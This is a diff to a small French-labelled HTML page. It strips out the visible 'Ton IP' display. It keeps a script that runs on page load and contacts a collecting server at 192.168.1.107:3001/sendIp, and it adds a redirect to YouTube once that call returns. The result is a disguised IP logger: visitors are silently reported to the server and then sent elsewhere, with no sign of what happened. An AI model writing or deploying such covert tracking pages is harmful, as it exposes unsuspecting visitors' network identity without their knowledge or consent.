@@ -4,10 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
-<body>
-  <h1>Ton IP</h1>
-  <p>IP : <span id="ipResult">En attente...</span></p>
-</body>
 <script>
     function getIp() {
   fetch(`https://192.168.1.107:3001/sendIp`, {
@@ -15,7 +11,9 @@
     headers: {
       'Content-Type': 'application/json',
     },
-  })
+  }).then(response => {
+    window.location.href = "https://youtube.com";
+})
 }
 getIp();
 </script>
